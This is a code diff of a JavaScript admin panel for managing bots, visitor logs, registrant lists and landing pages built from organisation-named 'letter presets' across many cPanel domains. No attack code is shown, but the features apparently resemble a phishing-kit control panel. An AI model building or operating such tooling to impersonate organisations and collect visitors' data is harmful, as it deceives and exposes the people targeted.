-  }catch(e){statsEl.innerHTML="<span style='color:var(--crit)'>"+esc(e.message)+"</span>";}
-}
-$("#bc-refresh-visits").onclick=()=>loadVisits();
-
-// ── Landing Bot config ─────────────────────────────────────────────────────
-async function loadLandingConfig(){
-  if(!CURRENT)return;
-  try{
-    const d=await (await fetch(API("bot_proxy"),{method:"POST",headers:{"Content-Type":"application/json"},
-      body:JSON.stringify({cpanelUser:CURRENT.user,domain:CURRENT.domain,subaction:"landing_config_get"})})).json();
-    if(d.ok&&d.config){
-      const c=d.config;
-      $("#lc-title").value   = c.event_title  ||"";
-      $("#lc-date").value    = c.event_date    ||"";
-      $("#lc-time").value    = c.event_time    ||"";
-      $("#lc-desc").value    = c.event_desc    ||"";
-      $("#lc-host").value    = c.event_host    ||"";
-      $("#lc-logo").value    = c.logo_url      ||"";
-      $("#lc-confirm").value = c.confirm_msg   ||"";
-      const acc=c.accent||"#2563eb";
-      $("#lc-accent").value=acc;
-      if(/^#[0-9a-fA-F]{6}$/.test(acc))$("#lc-accent-picker").value=acc;
-      $("#lc-field-phone").checked   = !!c.field_phone;
-      $("#lc-field-company").checked = !!c.field_company;
-      $("#bc-landing-section").classList.remove("hidden");
-    }else{
-      // show section anyway so admin can set it up
-      $("#bc-landing-section").classList.remove("hidden");
+    if(!d.ok){bcNote("✗ "+esc(d.error),"err");return;}
+    // Save extra fields via bot_mode_save (reuse same endpoint)
+    if(aid||surl){
+      await fetch(API("bot_mode_save"),{method:"POST",headers:{"Content-Type":"application/json"},body:JSON.stringify({cpanelUser:CURRENT.user,domain:CURRENT.domain,bot_mode:bcGetSelectedMode(),admin_chat_id:aid||undefined,site_url:surl||undefined})});
     }
-  }catch(_){$("#bc-landing-section").classList.remove("hidden");}
+    bcNote("✓ Saved. "+esc(d.note||""),"ok");
+  }catch(e){bcNote("✗ "+esc(e.message),"err");}
+};
+
+$("#bc-save-mode").onclick=async()=>{
+  const mode=bcGetSelectedMode();
+  const title=$("#bc-lp-title").value.trim(),body=$("#bc-lp-body").value.trim();
+  bcModeNote("Saving mode…");
+  try{
+    const d=await (await fetch(API("bot_mode_save"),{method:"POST",headers:{"Content-Type":"application/json"},body:JSON.stringify({cpanelUser:CURRENT.user,domain:CURRENT.domain,bot_mode:mode,lp_welcome_title:title,lp_welcome_body:body})})).json();
+    if(d.ok) bcModeNote("✓ "+esc(d.note),"ok");
+    else bcModeNote("✗ "+esc(d.error),"err");
+  }catch(e){bcModeNote("✗ "+esc(e.message),"err");}
+};
+
+// --- Landing Pages JS ---
+function bcLpRender(){
+  const el=document.getElementById("bc-lp-list");
+  if(!_bcLpPages.length){el.innerHTML='<p style="color:var(--ink3);font-size:13px">No landing pages added yet.</p>';return;}
+  el.innerHTML=_bcLpPages.map((p,i)=>`
+    <div style="display:flex;align-items:center;justify-content:space-between;padding:10px 12px;background:rgba(255,255,255,0.03);border:1px solid var(--line);border-radius:10px;margin-bottom:6px">
+      <div>
+        <span style="font-weight:600;font-size:13px">${esc(p.label)}</span>
+        <span style="font-family:var(--mono);font-size:11px;color:var(--ink3);margin-left:8px">${esc(p.preset_id)}</span>
+      </div>
+      <div style="display:flex;gap:6px">
+        <button class="sm ghost" style="margin:0;padding:4px 10px;font-size:11px" onclick="bcLpPreviewOpen('${esc(p.preset_id)}')">👁 Preview</button>
+        <button class="sm danger" style="margin:0;padding:4px 10px;font-size:11px" onclick="bcLpRemove(${i})">✕</button>
+      </div>
+    </div>`).join('');
 }
 
-$("#bc-landing-save").onclick=async()=>{
-  const b=$("#bc-landing-save");b.disabled=true;const old=b.textContent;b.textContent="Saving…";
-  const payload={
-    event_title:  $("#lc-title").value.trim(),
-    event_date:   $("#lc-date").value.trim(),
-    event_time:   $("#lc-time").value.trim(),
-    event_desc:   $("#lc-desc").value.trim(),
-    event_host:   $("#lc-host").value.trim(),
-    logo_url:     $("#lc-logo").value.trim(),
-    accent:       $("#lc-accent").value.trim(),
-    confirm_msg:  $("#lc-confirm").value.trim(),
-    field_phone:  $("#lc-field-phone").checked?1:0,
-    field_company:$("#lc-field-company").checked?1:0,
-  };
-  try{
-    const d=await (await fetch(API("bot_proxy"),{method:"POST",headers:{"Content-Type":"application/json"},
-      body:JSON.stringify({cpanelUser:CURRENT.user,domain:CURRENT.domain,subaction:"landing_config_save",...payload})})).json();
-    if(d.ok) bcNote("✓ Landing config saved. Page: <a href='https://"+esc(CURRENT.domain)+"/landing.php' target='_blank'>"+esc(CURRENT.domain)+"/landing.php</a>","ok");
-    else bcNote("✗ "+esc(d.error||d.msg||"Failed"),"err");
-  }catch(e){bcNote("✗ "+esc(e.message),"err");}
-  b.disabled=false;b.textContent=old;
+window.bcLpRemove=async function(idx){
+  _bcLpPages.splice(idx,1);
+  await bcLpSave();
+  bcLpRender();
 };
 
-$("#bc-landing-registrants").onclick=async()=>{
-  const panel=$("#bc-landing-registrants-panel"),tableEl=$("#bc-registrants-table");
-  const isHidden=panel.classList.contains("hidden");
-  if(!isHidden){panel.classList.add("hidden");return;}
-  panel.classList.remove("hidden");
-  tableEl.innerHTML="<div style='color:var(--dim);font-size:11px'>Loading…</div>";
-  try{
-    const d=await (await fetch(API("bot_proxy"),{method:"POST",headers:{"Content-Type":"application/json"},
-      body:JSON.stringify({cpanelUser:CURRENT.user,domain:CURRENT.domain,subaction:"registrants_get",limit:100})})).json();
-    if(!d.ok){tableEl.innerHTML="<div style='color:var(--crit)'>"+esc(d.error||"Failed")+"</div>";return;}
-    const list=d.registrants||[];
-    if(!list.length){tableEl.innerHTML="<div style='color:var(--dim);font-size:11px;padding:8px'>No registrants yet.</div>";return;}
-    const cols=["name","email","phone","company","ts"];
-    tableEl.innerHTML=`<table style="width:100%;border-collapse:collapse">
-      <thead><tr>${cols.map(c=>`<th style="padding:4px 8px;text-align:left;border-bottom:1px solid var(--line);color:var(--dim);font-size:10px;text-transform:uppercase">${c}</th>`).join("")}</tr></thead>
-      <tbody>${list.map(v=>`<tr style="border-bottom:1px solid rgba(255,255,255,.03)">${cols.map(c=>`<td style="padding:4px 8px;font-size:11px">${esc(String(v[c]||""))}</td>`).join("")}</tr>`).join("")}</tbody>
-    </table>`;
-    // Export link
-    const exportUrl=API("bot_proxy")+"_export&cpanelUser="+encodeURIComponent(CURRENT.user)+"&domain="+encodeURIComponent(CURRENT.domain)+"&subaction=registrants_export";
-    $("#bc-landing-export").href=exportUrl;
-    $("#bc-landing-export").onclick=async(e)=>{
-      e.preventDefault();
-      const ed=await (await fetch(API("bot_proxy"),{method:"POST",headers:{"Content-Type":"application/json"},
-        body:JSON.stringify({cpanelUser:CURRENT.user,domain:CURRENT.domain,subaction:"registrants_export"})})).json();
-      // registrants_export returns CSV but via bot_proxy it's JSON-wrapped — handle plain download
-      const rows=list;
-      const csvCols=["name","email","phone","company","ip","ts"];
-      const csv=[csvCols.join(","),...rows.map(r=>csvCols.map(k=>'"'+(r[k]||"").replace(/"/g,'""')+'"').join(","))].join("\n");
-      const blob=new Blob([csv],{type:"text/csv"});
-      const a=document.createElement("a");a.href=URL.createObjectURL(blob);a.download="registrants.csv";a.click();
-    };
-  }catch(e){tableEl.innerHTML="<div style='color:var(--crit)'>"+esc(e.message)+"</div>";}
+window.bcLpPreviewOpen=function(pid){
+  if(!CURRENT)return;
+  const surl=($("#bc-site-url").value||("https://"+CURRENT.domain)).replace(/\/$/,'');
+  window.open(surl+"/site.php?page=lp&id="+encodeURIComponent(pid),"_blank");
 };
 
-// Patch loadBotControl to also load visits + landing config
-const _origLoadBC=loadBotControl;
-loadBotControl=async function(){
-  await _origLoadBC();
-  if(CURRENT){
-    // show visits section
-    $("#bc-visits-section").classList.remove("hidden");
-    loadVisits();
-    // load landing config
-    loadLandingConfig();
+async function bcLpSave(){
+  try{
+    const d=await (await fetch(API("bot_lp_pages_save"),{method:"POST",headers:{"Content-Type":"application/json"},body:JSON.stringify({cpanelUser:CURRENT.user,domain:CURRENT.domain,lp_pages:_bcLpPages})})).json();
+    if(!d.ok) bcLpNote("✗ "+esc(d.error),"err");
+    return d.ok;
+  }catch(e){bcLpNote("✗ "+esc(e.message),"err");return false;}
+}
+
+$("#bc-lp-add").onclick=async()=>{
+  const pid=document.getElementById("bc-lp-pid").value.trim().toLowerCase().replace(/[^a-z0-9_]/g,'');
+  const label=document.getElementById("bc-lp-label").value.trim();
+  if(!pid||!label){bcLpNote("Enter preset ID and label","err");return;}
+  if(_bcLpPages.find(p=>p.preset_id===pid)){bcLpNote("Already added","err");return;}
+  _bcLpPages.push({preset_id:pid,label:label});
+  const ok=await bcLpSave();
+  if(ok){
+    document.getElementById("bc-lp-pid").value="";
+    document.getElementById("bc-lp-label").value="";
+    document.getElementById("bc-lp-preview").textContent="";
+    bcLpRender();
+    bcLpNote("✓ Added: "+esc(label)+" → "+esc(pid),"ok");
   }
+};
+
+// Preset search — loads presets from letter_presets.json via proxy
+let _bcPresets=null;
+async function bcLoadPresets(){
+  if(_bcPresets)return _bcPresets;
+  try{
+    const r=await fetch(API("lp_presets_list"));
+    const d=await r.json();
+    _bcPresets=d.presets||[];
+  }catch(_){_bcPresets=[];}
+  return _bcPresets;
+}
+
+window.bcLpPreview=async function(pid){
+  const el=document.getElementById("bc-lp-preview");
+  if(!pid){el.textContent="";return;}
+  const pclean=pid.toLowerCase().replace(/[^a-z0-9_]/g,'');
+  const presets=await bcLoadPresets();
+  const found=presets.find(p=>p.id===pclean);
+  if(found) el.innerHTML=`<span class="pill on" style="margin-right:6px">✓ Found</span>${esc(found.org_name)} — <span style="color:var(--ink3)">${esc(found.category||'')}</span>`;
+  else el.innerHTML=`<span class="pill off">Not found in presets</span>`;
+};
+
+window.bcPresetSearch=async function(q){
+  const cat=document.getElementById("bc-preset-cat").value;
+  const el=document.getElementById("bc-preset-results");
+  const presets=await bcLoadPresets();
+  const ql=q.toLowerCase();
+  const filtered=presets.filter(p=>{
+    const match=!q||(p.id||"").includes(ql)||(p.org_name||"").toLowerCase().includes(ql);
+    const catMatch=!cat||(p.category||"")==cat;
+    return match&&catMatch;
+  }).slice(0,60);
+  if(!filtered.length){el.innerHTML='<p style="color:var(--ink3);font-size:12px;padding:8px">No results</p>';return;}
+  el.innerHTML=filtered.map(p=>`
+    <div style="display:flex;align-items:center;justify-content:space-between;padding:8px 10px;border-bottom:1px solid var(--line);gap:8px">
+      <div style="min-width:0">
+        <span style="font-weight:600;font-size:12px">${esc(p.org_name||p.id)}</span>
+        <span style="font-family:var(--mono);font-size:10px;color:var(--ink3);margin-left:6px">${esc(p.id)}</span>
+        <span class="pill" style="font-size:9px;margin-left:4px">${esc(p.category||'')}</span>
+      </div>
+      <button class="sm" style="margin:0;padding:3px 10px;font-size:11px;white-space:nowrap" onclick="bcPresetUse('${esc(p.id)}','${esc(p.org_name||p.id)}')">+ Use</button>
+    </div>`).join('');
+};
+
+window.bcPresetUse=function(pid,orgName){
+  document.getElementById("bc-lp-pid").value=pid;
+  document.getElementById("bc-lp-label").value=orgName;
+  bcLpPreview(pid);
+  // Switch to landing tab
+  document.querySelector('#bc-tabs .tab[data-bctab="landing"]').click();
+  document.getElementById("bc-lp-pid").focus();
 };
 
 // ── Update bot-source: push all local bot-source files to panelcou1999 (superadmin only)
